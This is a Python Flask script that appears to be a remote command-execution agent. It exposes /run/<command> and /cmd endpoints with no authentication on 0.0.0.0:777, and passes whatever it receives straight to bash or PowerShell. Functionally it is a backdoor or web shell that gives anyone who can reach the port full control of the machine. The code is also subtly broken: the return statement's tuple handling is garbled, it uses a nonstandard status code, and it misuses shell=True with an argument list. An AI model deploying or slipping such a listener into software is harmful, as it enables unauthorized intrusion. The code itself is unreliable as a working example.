#!/usr/bin/env python3

from flask import Flask, request
import platform, subprocess

app = Flask(__name__)

@app.route('/status', methods=['GET'])
def status():
    return "Active", 200

@app.route('/run/<command>', methods=['GET'])
def run_command(command):
    try:
        if platform.system() == "Windows":
            result = subprocess.run(["powershell", "-Command", command], capture_output=True, text=True)
        else:
            result = subprocess.run(["/bin/bash","-c",command], shell=True, capture_output=True, text=True)
        return result.stdout, 222 if result.stdout else result.stderr, result.returncode
    except Exception as e:
        return str(e), 500
    
@app.route('/cmd', methods=['POST'])
def handle_command():
    command = request.json.get('command')
    return run_command(command)

if __name__ == "__main__":
    app.run(debug=False,host='0.0.0.0',port=777)